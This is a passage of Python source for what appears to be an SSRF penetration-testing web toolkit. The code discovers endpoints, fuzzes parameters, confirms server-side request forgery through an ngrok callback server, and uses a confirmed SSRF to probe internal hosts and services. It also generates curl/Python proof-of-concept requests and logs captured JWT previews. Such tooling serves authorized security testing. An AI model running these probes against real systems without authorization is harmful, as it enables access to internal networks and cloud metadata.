                                            # Emit detailed finding to UI via SocketIO
                                            add_finding({
                                                'severity': severity,
                                                'category': 'SSRF',
                                                'title': f"Server-Side Request Forgery in {param_name}",
                                                'description': f"SSRF detected using {test_name} strategy. The application makes outbound requests to attacker-controlled URLs, allowing access to internal resources and cloud metadata.",
                                                'affected_url': url,
                                                'method': method,
                                                'parameter': param_name,
                                                'original_value': original_value,
                                                'payload': test_url,
                                                'evidence': evidence_keywords_str,
                                                'request': request_str,
                                                'response': response_str[:1000],  # Limit response size
                                                'proof_of_concept': f"# SSRF Exploitation - {test_name}\n\n# Using curl:\ncurl -X {method} '{url}' \\\n  -H 'Content-Type: application/json' \\\n  -d '{{ \"{param_name}\": \"{test_url}\" }}'\n\n# Using Python:\nimport requests\nrequests.{method.lower()}('{url}', json={{'{param_name}': '{test_url}'}})\n\n# Evidence found: {evidence_keywords_str}",
                                                'remediation': "1. Implement strict allowlist for outbound requests\n2. Validate and sanitize all user-supplied URLs\n3. Use network segmentation to prevent access to internal/cloud metadata endpoints\n4. Disable unnecessary URL schemas (file://, gopher://, etc.)\n5. Monitor outbound requests for suspicious patterns",
                                                'cvss_score': 9.1 if is_critical else 8.2,
                                                'cwe_id': 'CWE-918',
                                                'references': ['https://owasp.org/www-community/attacks/Server_Side_Request_Forgery', 'https://portswigger.net/web-security/ssrf'],
                                                'attack_vector': test_url,  # For "Attack" button
                                                'timestamp': datetime.now().isoformat()
                                            })
                                            
                                        except Exception as save_err:
                                            web_logger.error(f"    ❌ Failed to save finding to database: {save_err}")
                                            # Continue testing even if DB save fails
                                        
                                        # Mark SSRF confirmed for this param to stop further tests
                                        ssrf_confirmed_for_param = True
                                        
                                        # If critical, break immediately
                                        if is_critical:
                                            web_logger.info(f"    🚨 CRITICAL SSRF found - stopping further tests for this parameter")
                                            break
                                    else:
                                        web_logger.info(f"    ❌ No SSRF evidence found for {test_name}")
                                    
                                    # Small delay between tests
                                    import time
                                    time.sleep(0.5)
                                    
                                except Exception as e:
                                    # Emit error clearly to UI
                                    error_msg = f"Test failed: {str(e)}"
                                    web_logger.error(f"    ❌ {error_msg}")
                                    continue
                    
                except json.JSONDecodeError:
                    web_logger.info(f"  ⚠️ Could not parse JSON body for {url}")
                    continue
            
            # Update progress
            progress = 10 + (requests_analyzed / len(har_data['requests'])) * 80
            update_progress(f'Testing request {requests_analyzed}/{len(har_data["requests"])}', int(progress))
            
        except Exception as e:
            web_logger.error(f"❌ Error analyzing request: {str(e)}")
            continue
    
    # Summary
    update_progress('Focused SSRF Testing Complete', 100)
    web_logger.info(f"✅ Focused SSRF Testing Complete!")
    web_logger.info(f"📊 Analyzed {requests_analyzed} requests from Burp Suite file")
    web_logger.info(f"🔥 Found {len(ssrf_findings)} SSRF vulnerabilities")
    
    if ssrf_findings:
        web_logger.info("🎯 SSRF Vulnerabilities Summary:")
        for i, finding in enumerate(ssrf_findings, 1):
            web_logger.info(f"  {i}. {finding['method']} {finding['endpoint']}")
            web_logger.info(f"     Parameter: {finding['parameter']}")
            web_logger.info(f"     Original: {finding['original_value']}")
            web_logger.info(f"     Payload: {finding['ssrf_payload']}")

def run_blackbox(config: ToolkitConfig, db: FindingDatabase):
    """Run black box testing"""
    web_logger.info("🎯 Starting Black Box Testing")
    target_url = config.blackbox.target_url
    fuzz_results = []
    discovered_endpoints = []
    
    # Get HAR/Burp data to check if we should focus on specific endpoints
    har_data = get_scan_state_value('har_data')
    endpoint_source = get_scan_state_value('endpoint_source', 'file')
    
    # If we have specific Burp/HAR data, prioritize direct testing over discovery
    if har_data and har_data.get('requests') and endpoint_source == 'file':
        web_logger.info("🎯 TARGETED MODE: Using specific endpoints from Burp Suite/HAR file")
        web_logger.info(f"📁 Found {len(har_data['requests'])} requests to analyze directly")
        
        # Run focused SSRF testing on the specific requests from file
        run_focused_ssrf_testing(config, db, har_data)
        return
    
    # Check if Auto Discovery mode is enabled
    if config.blackbox.auto_discovery:
        web_logger.info("🤖 AUTO DISCOVERY MODE - Full automation enabled")
        web_logger.info(f"🎯 Target domain: {target_url}")
        web_logger.info("📋 Process: Crawl → Discover → Test → Confirm → Report")
        
        # Phase 1: Auto Discovery and Intelligent Testing
        update_progress('Auto Discovery & Testing', 10)
        
        try:
            # Initialize auto discovery with callback server (singleton pattern)
            callback_server = get_or_create_callback_server(port=8888)
            set_callback_server(callback_server)
            
            web_logger.info(f"📡 Callback server ready on http://0.0.0.0:8888")
            
            # Auto-detect public callback URL (ngrok)
            public_callback_base, callback_source = detect_public_callback_url()
            if public_callback_base:
                web_logger.info(f"✅ Auto-detected {callback_source} tunnel: {public_callback_base}")
            else:
                web_logger.info(f"⚠️ No public callback detected. Using local addresses.")
            
            # Get all callback addresses for Docker/LAN environments
            callback_addresses = callback_server.get_all_callback_addresses()
            web_logger.info(f"🌐 Callback addresses: {', '.join(callback_addresses)}")
            
            # Initialize auto discovery
            auto_disco = AutoDiscovery(
                base_url=target_url,
                timeout=config.blackbox.timeout
            )
            
            # Run full auto discovery and testing (với ngrok URL ưu tiên)
            web_logger.info("🚀 Starting comprehensive auto-discovery...")
            auto_results = auto_disco.run_full_discovery(
                callback_url=public_callback_base,  # ✅ Truyền ngrok URL vào!
                callback_server=callback_server
            )
            
            # Process results
            discovered_endpoints = auto_results.get('endpoints', [])
            testable_endpoints = auto_results.get('testable_endpoints', [])
            ssrf_vulnerabilities = auto_results.get('ssrf_vulnerabilities', [])
            forms = auto_results.get('forms', [])
            api_endpoints = auto_results.get('api_endpoints', [])
            
            web_logger.info(f"✅ Auto Discovery Complete!")
            web_logger.info(f"📊 Statistics:")
            web_logger.info(f"  • Endpoints discovered: {len(discovered_endpoints)}")
            web_logger.info(f"  • API endpoints: {len(api_endpoints)}")
            web_logger.info(f"  • Forms found: {len(forms)}")
            web_logger.info(f"  • Testable endpoints: {len(testable_endpoints)}")
            web_logger.info(f"  • SSRF vulnerabilities: {len(ssrf_vulnerabilities)}")
            
            # Emit SSRF vulnerabilities as HIGH severity findings
            for vuln in ssrf_vulnerabilities:
                endpoint = vuln.get('endpoint', '')
                parameter = vuln.get('parameter', '')
                payload = vuln.get('payload', '')
                callback_received = vuln.get('callback_received', {})
                
                msg = f"🔥 CONFIRMED SSRF: {endpoint} (param: {parameter})"
                web_logger.finding('HIGH', msg)
                web_logger.info(f"     💥 Payload: {payload}")
                web_logger.info(f"     📡 Callback received: {callback_received.get('path', 'N/A')}")
            
            # Emit discovered endpoints to UI
            for endpoint in discovered_endpoints:
                web_logger.endpoint({
                    'url': str(endpoint),
                    'status_code': 200,
                    'content_length': 0,
                    'content_type': 'auto-discovered'
                })
            
            # Emit testable endpoints as findings
            for testable in testable_endpoints:
                endpoint_url = testable.get('url', '')
                parameters = testable.get('parameters', [])
                
                if parameters:
                    param_list = ', '.join(parameters)
                    msg = f"🎯 Testable SSRF endpoint found: {endpoint_url} with parameters: {param_list}"
                    web_logger.finding('MEDIUM', msg)
            
            update_progress('Auto Discovery Complete', 70)
            
            # Phase 2: Internal Scanning (if testable endpoints found)
            if config.blackbox.internal_scan and testable_endpoints:
                update_progress('Internal Network Scanning', 75)
                web_logger.info("🔍 Phase: Internal Network Scanning")
                
                # Use first testable endpoint for internal scanning
                if testable_endpoints:
                    first_testable = testable_endpoints[0]
                    endpoint_url = first_testable.get('url', target_url)
                    params = first_testable.get('parameters', [])
                    
                    if params:
                        try:
                            scanner = InternalScanner(
                                ssrf_url=endpoint_url,
                                ssrf_param=params[0],  # Use first parameter
                                timeout=config.blackbox.timeout
                            )
                        
                            internal_results = scanner.scan_internal_network()
                            
                            for result in internal_results:
                                web_logger.info(f"  • {result['target']}: {result['status']}")
                                
                                if result['accessible']:
                                    msg = f"Internal host accessible: {result['target']} via SSRF at {endpoint_url}"
                                    web_logger.finding('HIGH', msg)
                                    
                                    finding = Finding(
                                        title=f"Internal Network Access via SSRF",
                                        severity='HIGH',
                                        description=f"Internal host {result['target']} accessible through SSRF",
                                        affected_endpoint=endpoint_url,
                                        evidence=f"Parameter: {params[0]}, Internal Target: {result['target']}",
                                        remediation="Restrict internal network access and implement network segmentation"
                                    )
                                    db.add_finding(finding)
                                    add_finding(finding.to_dict())
                            
                            web_logger.info("✅ Internal scanning complete")
                        except Exception as e:
                            web_logger.warning(f"⚠️ Internal scanning failed: {str(e)}")
                
                update_progress('Internal Scanning Complete', 90)
            
            # Don't stop callback server here - let it be reused by next scan
            # It will be cleaned up when app exits or explicitly stopped
            web_logger.info("✅ Keeping callback server alive for potential reuse")
            
            return  # Exit auto discovery mode
            
        except Exception as e:
            import traceback
            error_detail = traceback.format_exc()
            web_logger.error(f"❌ Auto Discovery failed: {str(e)}")
            web_logger.error(f"Details: {error_detail}")
            
            # Don't stop callback server on error - it may be reusable
            # Just clear the reference from scan_state
            set_callback_server(None)
            
            # Fall back to manual mode
            web_logger.info("⚠️ Falling back to manual discovery mode...")
    
    # Check if HAR data is available (Manual Mode)
    har_data = get_scan_state_value('har_data')
    endpoint_source = get_scan_state_value('endpoint_source', 'file')  # 'file', 'url', or 'both'
    
    # Determine which endpoints to use based on endpoint_source
    if har_data and endpoint_source in ['file', 'both']:
        # Phase 1: Extract Endpoints from Traffic Capture (Burp Suite or HAR)
        update_progress('Extracting Endpoints from Traffic Capture', 10)
        source = har_data.get('source', 'Traffic Capture')
        web_logger.info(f"📁 Phase 1: Extracting Endpoints from {source}")
        web_logger.info(f"📊 Stats: {har_data['stats']['total_requests']} requests, {har_data['stats']['unique_endpoints']} endpoints")
        
        # Log authenticated requests
        auth_count = har_data['stats']['authenticated_requests']
        if auth_count > 0:
            web_logger.info(f"🔐 Found {auth_count} authenticated requests (with JWT/cookies)")
        
        # Extract all unique URLs from capture
        for req in har_data['requests']:
            url = req['url']
            if url not in discovered_endpoints:
                discovered_endpoints.append(url)
                
                # Emit endpoint to UI
                web_logger.endpoint({
                    'url': url,
                    'status_code': 200,  # From capture, so it was successful
                    'content_length': len(str(req.get('post_data', ''))),
                    'content_type': req['headers'].get('Content-Type', 'unknown')
                })
                
                # Show method and auth info
                method = req.get('method', 'GET')
                log_msg = f"  ✓ {method} {url}"
                
                # Highlight if authenticated
                if 'Authorization' in req.get('headers', {}):
                    auth_header = req['headers']['Authorization']
                    if 'Bearer' in auth_header:
                        token_preview = auth_header.split('Bearer ')[-1][:40]
                        log_msg += f" 🔐 [JWT: {token_preview}...]"
                    else:
                        log_msg += f" 🔐 [Auth: {auth_header[:30]}...]"
                elif 'Cookie' in req.get('headers', {}):
                    log_msg += " 🍪 [Has Cookies]"
                
                web_logger.info(log_msg)
        
        web_logger.info(f"✅ Extracted {len(discovered_endpoints)} unique endpoints from {source}")
        update_progress('Traffic Capture Extraction Complete', 20)
    
    # Also discover from URL if requested ('url' or 'both')
    if (not har_data and config.blackbox.endpoint_discovery) or (har_data and endpoint_source in ['url', 'both']):
        # Phase: Comprehensive Endpoint Discovery from URL
        if endpoint_source == 'both':
            update_progress('Additional Discovery from URL', 25)
            web_logger.info("🔍 Phase: Additional Endpoint Discovery from URL")
        else:
            update_progress('Endpoint Discovery', 10)
            web_logger.info("📡 Phase 1: Comprehensive Endpoint Discovery")
        web_logger.info(f"🎯 Target: {target_url}")
        
        try:
            # Use Enhanced Endpoint Discovery V2
            discovery = EndpointDiscoveryV2(
                target_url, 
                timeout=config.blackbox.timeout,
                max_workers=3,
                rate_limit=2.0
            )
            
            # Use comprehensive discovery (robots.txt, sitemap, wordlist, javascript)
            endpoint_results = discovery.discover_comprehensive()
            
            # Extract URLs from V2 discovery results and emit to UI
            for result in endpoint_results:
                # Avoid duplicates when merging file + url discovery
                if result.url not in discovered_endpoints:
                    discovered_endpoints.append(result.url)
                    web_logger.info(f"  ✓ {result.url} [{result.status_code}] - {result.severity.upper()}")
                    
                    # Emit enhanced endpoint info to UI
                    web_logger.endpoint({
                        'url': result.url,
                        'status_code': result.status_code,
                        'content_length': result.content_length,
                        'content_type': result.content_type,
                        'severity': result.severity,
                        'source': result.source,
                        'accepts_post': result.accepts_post,
                        'ssrf_potential': result.ssrf_potential,
                        'response_time': result.response_time
                    })
            
            # Get discovery summary
            summary = discovery.get_summary()
            web_logger.info(f"📊 Discovery Summary:")
            web_logger.info(f"   Total endpoints: {summary['total_endpoints']}")
            web_logger.info(f"   Severity breakdown: {summary['severity_breakdown']}")
            web_logger.info(f"   Success rate: {summary['statistics']['successful_requests']}/{summary['statistics']['total_requests']}")
            
            if endpoint_source == 'both':
                web_logger.info(f"✅ Total endpoints: {len(discovered_endpoints)} (File + URL discovery)")
            else:
                web_logger.info(f"✅ Discovered {len(discovered_endpoints)} unique endpoints")
            
            # If no endpoints found, use base URL
            if not discovered_endpoints:
                web_logger.info("ℹ️ No endpoints found, will test base URL")
                discovered_endpoints = [target_url]
        except Exception as e:
            web_logger.warning(f"⚠️ Endpoint discovery failed: {str(e)}")
            import traceback
            web_logger.error(traceback.format_exc())
            web_logger.info("ℹ️ Proceeding with target URL directly")
            discovered_endpoints = [target_url]
        
        update_progress('Endpoint Discovery Complete', 20)
    elif not har_data or endpoint_source == 'url':
        # Skip discovery if we're using file-only and not in discovery mode
        if not config.blackbox.endpoint_discovery and not har_data:
            # Skip discovery, just use target URL
            web_logger.info("ℹ️ Endpoint discovery disabled, using target URL directly")
            discovered_endpoints = [target_url]
    
    # Fallback if no endpoints discovered
    if not discovered_endpoints:
        web_logger.info("ℹ️ No endpoints found, using target URL as fallback")
        discovered_endpoints = [target_url]
    
    # Filter endpoints if custom selection provided
    custom_endpoints = get_scan_state_value('custom_endpoints')
    if custom_endpoints:
        original_count = len(discovered_endpoints)
        discovered_endpoints = [e for e in discovered_endpoints if e in custom_endpoints]
        web_logger.info(f"🎯 Filtered to {len(discovered_endpoints)} selected endpoints (from {original_count})")
    
    # Phase 2: Parameter Fuzzing on ALL discovered endpoints
    if config.blackbox.parameter_fuzzing:
        update_progress('Parameter Fuzzing', 30)
        web_logger.info(f"🔍 Phase 2: Parameter Fuzzing ({len(discovered_endpoints)} endpoints)")
        
        # Get custom selections
        custom_params = get_scan_state_value('custom_params')
        custom_payloads = get_scan_state_value('custom_payloads')
        
        fuzzer = ParameterFuzzer(
            timeout=config.blackbox.timeout,
            custom_params=custom_params,
            custom_payloads=custom_payloads
        )
        
        # Fuzz each discovered endpoint
        for idx, endpoint_url in enumerate(discovered_endpoints):
            web_logger.info(f"[{idx+1}/{len(discovered_endpoints)}] Fuzzing: {endpoint_url}")
            
            endpoint_fuzz_results = fuzzer.fuzz_endpoint(endpoint_url)
            fuzz_results.extend(endpoint_fuzz_results)
        
        for result in fuzz_results:
            # Report based on confidence levels
            confidence = result['confidence']
            param = result['parameter']
            
            if confidence >= 0.7:
                severity = 'CRITICAL'
                msg = f"🔥 High-probability SSRF: {param} (confidence: {confidence:.2f})"
                web_logger.finding(severity, msg)
            elif confidence >= 0.5:
                severity = 'HIGH'
                msg = f"⚠️ Likely SSRF parameter: {param} (confidence: {confidence:.2f})"
                web_logger.finding(severity, msg)
            elif confidence >= 0.3:
                severity = 'MEDIUM'
                msg = f"🔍 Suspicious SSRF parameter: {param} (confidence: {confidence:.2f})"
                web_logger.finding(severity, msg)
            elif confidence >= 0.1:
                # Low confidence - only report if there are actual behavioral indicators
                if len(result.get('findings', [])) > 0:
                    severity = 'LOW'
                    msg = f"💡 Potential SSRF by name: {param} (confidence: {confidence:.2f})"
                    web_logger.finding(severity, msg)
                else:
                    # Very low confidence with no indicators - just log to console
                    web_logger.info(f"ℹ️ Parameter tested: {param} (confidence: {confidence:.2f}) - likely false positive")
            else:
                # Extremely low confidence (< 0.1) - don't report as finding
                web_logger.info(f"ℹ️ Noise filtered: {param} (confidence: {confidence:.2f})")
        
        update_progress('Parameter Fuzzing Complete', 45)
    
    # Phase 3: Callback Testing
    if config.blackbox.external_callback_test and len(fuzz_results) > 0:
        update_progress('Callback Testing', 50)
        web_logger.info("📞 Phase 3: External Callback Testing")
        
        # Use singleton callback server to avoid port conflicts
        callback_server = get_or_create_callback_server(port=8888)
        set_callback_server(callback_server)
        
        detector = ExternalCallbackDetector(callback_server)
        
        # Test ALL suspicious parameters, not just high confidence ones
        for idx, result in enumerate(fuzz_results):
            web_logger.info(f"[{idx+1}/{len(fuzz_results)}] Testing callback for parameter: {result['parameter']} at {result['url']}")
            
            try:
                callback_result = detector.test_ssrf(
                    target_url=result['url'],  # Use the endpoint URL where parameter was found
                    parameter=result['parameter'],
                    timeout=10
                )
                
                if callback_result['is_vulnerable']:
                    web_logger.finding('CRITICAL',
                        f"✅ CONFIRMED SSRF via {result['parameter']} at {result['url']} - Received {callback_result['callbacks_received']} callbacks"
                    )
                else:
                    web_logger.info(f"❌ No callback received for {result['parameter']}")
            except Exception as e:
                web_logger.error(f"Error testing {result['parameter']}: {str(e)}")
        
        update_progress('Callback Testing Complete', 65)
    
    # Phase 4: Internal Scanning (Only if SSRF confirmed via callback)
    if config.blackbox.internal_scan and len(fuzz_results) > 0:
        # Check if we have ANY confirmed SSRF from callback testing
        confirmed_ssrf = False
        ssrf_param = None
        ssrf_url = None
        
        for result in fuzz_results:
            if result.get('is_vulnerable'):
                confirmed_ssrf = True
                ssrf_param = result['parameter']
                ssrf_url = result['url']
                break
        
        if not confirmed_ssrf:
            web_logger.warning("⚠️ Skipping internal scan - No confirmed SSRF vulnerability")
            web_logger.info("💡 Internal scanning requires a confirmed SSRF to avoid scanning pentester's own machine")
            update_progress('Internal Scan Skipped', 70)
        else:
            update_progress('Internal Network Scanning', 70)
            web_logger.info("🔎 Phase 4: Internal Network Scanning")
            web_logger.info(f"🎯 Using confirmed SSRF parameter: {ssrf_param} at {ssrf_url}")
            web_logger.info(f"⚠️ Note: Scanning localhost of TARGET service, not pentester machine")
            
            try:
                scanner = InternalScanner(
                    ssrf_url=ssrf_url,
                    ssrf_param=ssrf_param,
                    timeout=5
                )
                
                services = scanner.discover_services()
                web_logger.info(f"🎯 Discovered {len(services)} internal services")
                
                for service in services:
                    web_logger.finding('HIGH',
                        f"Internal service accessible: {service['host']}:{service['port']} - {service['service']}"
                    )
            except Exception as e:
                web_logger.warning(f"Internal scanning failed: {str(e)}")
        
        update_progress('Internal Scanning Complete', 85)

def run_graybox(config: ToolkitConfig, db: FindingDatabase):
    """Run gray box testing"""
    web_logger.info("🔍 Starting Gray Box Testing")
    
    if config.graybox.docker_inspect:
        update_progress('Docker Inspection', 90)
        web_logger.info("🐳 Inspecting Docker Environment")
        
        try:
            inspector = DockerInspector()
            containers = inspector.list_containers()
            
            web_logger.info(f"Found {len(containers)} Docker containers")
            
            for container in containers:
                networks = inspector.get_container_networks(container['id'])
                for net in networks:
                    web_logger.info(f"Container {container['name']}: {net['ip']} in {net['network']}")
        except Exception as e:
            web_logger.warning(f"Docker inspection failed: {str(e)}")

def run_whitebox(config: ToolkitConfig, db: FindingDatabase):
    """Run white box testing"""
    web_logger.info("📝 Starting White Box Testing")
    
    if config.whitebox.code_scan and config.whitebox.source_code_path:
        update_progress('Code Scanning', 95)
        web_logger.info("🔍 Scanning source code")
        
        scanner = CodeScanner(config.whitebox.source_code_path)
        vulnerabilities = scanner.scan()
        
        for vuln in vulnerabilities:
            web_logger.finding(vuln['severity'],
                f"{vuln['type']} in {vuln['file']}:{vuln['line']} - {vuln['description']}"
            )

def update_progress(phase: str, progress: int):
    """Update scan progress (thread-safe)"""
    with scan_state_lock:
        scan_state['current_phase'] = phase
        scan_state['progress'] = progress
    socketio.emit('progress', {
        'phase': phase,
        'progress': progress,
        'percent': progress  # Add 'percent' for frontend compatibility
    })

@socketio.on('connect')
def handle_connect():
    """Handle client connection"""
    emit('connected', {'message': 'Connected to SSRF Pentest Toolkit'})

@socketio.on('disconnect')
def handle_disconnect():
    """Handle client disconnection"""
    pass

@socketio.on('stop_scan')
def handle_stop_scan():
    """Handle scan stop request"""
    with scan_state_lock:
        scan_state['is_running'] = False
    web_logger.info("⏹️ Scan stopped by user")
    emit('scan_stopped', {'message': 'Scan stopped'}, broadcast=True)

def cleanup_on_exit():
    """Cleanup resources on app exit"""
    web_logger.info("🧹 Cleaning up resources...")
    cleanup_callback_server()

if __name__ == '__main__':
    import atexit
    atexit.register(cleanup_on_exit)
    
    print("🚀 Starting Microservice SSRF Pentest Toolkit Web UI")
    print("📊 Dashboard: http://localhost:5000")
    
    # NOTE: Callback server is now standalone (tools/callback_server.py)
    # It should be started separately via run_with_ngrok_and_app.ps1
    # Comment out the old embedded callback server to avoid port conflicts
    # try:
    #     print("📡 Pre-starting callback server...")
    #     callback_server = get_or_create_callback_server(port=8888)
    #     print(f"✅ Callback server ready on http://0.0.0.0:8888")
    # except Exception as e:
    #     print(f"⚠️ Warning: Could not start callback server: {e}")
    #     print("   (It will be started automatically when scan begins)")
    
    print("=" * 60)
    
    try:
        socketio.run(app, host='0.0.0.0', port=5000, debug=True)
    except KeyboardInterrupt:
        print("\n⚠️ Shutting down...")
        cleanup_on_exit()
    except Exception as e:
        print(f"❌ Error: {e}")
        cleanup_on_exit()
